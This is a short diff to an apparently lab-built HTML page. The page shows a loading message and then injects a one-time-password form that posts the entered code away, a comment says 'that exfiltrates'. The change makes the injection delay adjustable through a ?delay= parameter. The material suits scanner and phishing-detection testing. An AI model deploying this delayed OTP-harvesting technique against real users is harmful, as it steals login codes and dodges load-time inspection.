@@ -8,6 +8,8 @@
   <div id="slot"><p>Loading your secure session...</p></div>
 
   <script>
+    // Lab knob: ms until the form appears (?delay=). Default 2500, capped at 60s.
+    const DELAY = Math.min(parseInt(new URLSearchParams(location.search).get("delay")) || 2500, 60000);
     // Harmless at load. After a delay, inject an OTP form that exfiltrates.
     setTimeout(() => {
       document.getElementById("slot").innerHTML =
@@ -21,6 +23,6 @@
           body: "otp=" + encodeURIComponent(code),
         });
       });
-    }, 2500);
+    }, DELAY);
   </script>
 </body></html>
